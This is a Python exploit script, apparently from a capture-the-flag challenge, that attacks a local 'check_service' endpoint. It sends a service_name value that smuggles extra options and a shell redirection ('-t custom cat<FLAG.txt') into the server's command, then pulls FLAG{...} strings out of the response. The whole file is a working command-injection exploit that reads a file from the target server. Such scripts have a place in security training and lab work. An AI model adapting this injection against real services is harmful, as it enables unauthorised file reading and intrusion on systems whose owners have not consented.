import requests
import re
import json

# Target URL
url = "http://127.0.0.1:32844/check_service"

# Exploit payload - inject command to read FLAG.txt
payload = {
    "service_name": "-t custom cat<FLAG.txt"
}

# Headers
headers = {
    "Content-Type": "application/json"
}

print("[*] Exploiting command injection vulnerability")
print(f"[*] Target URL: {url}")
print(f"[*] Payload: {json.dumps(payload, indent=2)}")
print()

try:
    # Send POST request
    response = requests.post(url, json=payload, headers=headers)
    
    # Print response details
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response Headers:")
    for key, value in response.headers.items():
        print(f"    {key}: {value}")
    print()
    
    print(f"[+] Response Body:")
    print(response.text)
    print()
    
    # Extract FLAG{} patterns
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    
    if flags:
        print("[!] FLAG(S) FOUND:")
        for flag in flags:
            print(f"    {flag}")
    else:
        print("[-] No FLAG{} pattern found in response")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")
except Exception as e:
    print(f"[-] Error: {e}")

